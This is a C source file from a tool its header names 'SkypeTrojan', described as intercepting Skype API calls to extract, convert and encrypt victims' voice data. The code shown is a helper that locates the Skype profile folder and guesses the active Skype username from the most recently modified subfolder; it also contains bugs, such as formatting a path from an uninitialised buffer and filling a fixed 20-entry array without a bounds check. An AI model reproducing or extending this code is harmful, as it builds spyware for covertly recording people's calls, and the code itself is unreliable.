/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>

#define MAX_BUF_SIZE 1024

int getActiveUser(char *, int);





/*
 *
 *
 */

int myCompare(const void *v1, const void *v2) 
{
  WIN32_FIND_DATA *a = (WIN32_FIND_DATA*)v1;
  WIN32_FIND_DATA *b = (WIN32_FIND_DATA*)v2;
	
  return CompareFileTime(&b->ftLastWriteTime, &a->ftLastWriteTime);
}



/*
 *
 *
 */

WIN32_FIND_DATA getLatest(WIN32_FIND_DATA *a, int nbr) 
{
  qsort(a, nbr, sizeof(WIN32_FIND_DATA), myCompare);
  return a[0];
}




/*
 *
 *
 */

int getActiveUser(char *pUsernameBuffer, int pBufferSize) 
{
  WIN32_FIND_DATA FindFileData;
  WIN32_FIND_DATA FileDatas[20];
  int mFDCount = 0;
  HANDLE hFind;
  char mDir[MAX_BUF_SIZE + 1];
  char mApplicationDir[MAX_BUF_SIZE + 1];
  char mUserProfile[MAX_BUF_SIZE + 1];
  int mRetVal = 1;
  
   	

  /*
   * Locate skype directory.
   *
   */

  ZeroMemory(mDir, sizeof(mDir));

  GetEnvironmentVariable(TEXT("APPDATA"), mApplicationDir, sizeof(mApplicationDir) - 1);
  sprintf(mDir, "%s\\Anwendungsdaten\\Skype\\*", mUserProfile);


  if (! PathFileExists(mDir))
  {
    ZeroMemory(mUserProfile, sizeof(mUserProfile));	
    ZeroMemory(mApplicationDir, sizeof(mApplicationDir)); 

    GetEnvironmentVariable(TEXT("userprofile"), mUserProfile, sizeof(mUserProfile) - 1 );
    sprintf(mDir, "%s\\Anwendungsdaten\\Skype\\*", mUserProfile);

    if (! PathFileExists(mDir))
    {
      ZeroMemory(mApplicationDir, sizeof(mApplicationDir)); 
      GetEnvironmentVariable(TEXT("userprofile"), mUserProfile, sizeof(mUserProfile) - 1 );
      sprintf(mDir, "%s\\Application Data\\Skype\\*", mUserProfile);
    }
  }



  hFind = FindFirstFile(mDir, &FindFileData);
  if (hFind == INVALID_HANDLE_VALUE) 
  {
    mRetVal = 1;
    goto END;
  } else {
    // Skip . and .. directories
    FindNextFile(hFind, &FindFileData);

     
    /*
     * Add each directory to the FileDatas array.
     *
     */

    while(FindNextFile(hFind, &FindFileData) != 0) 
      if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        FileDatas[mFDCount++] = FindFileData;

	
    /*
     * Sort the array with qsort.
     *
     */

    getLatest(&FileDatas[0], mFDCount);
    FindClose(hFind);
    
    strncpy(pUsernameBuffer, FileDatas[0].cFileName, pBufferSize);

    mRetVal = 0;
    goto END;
  }

END:
  
  return(mRetVal);
}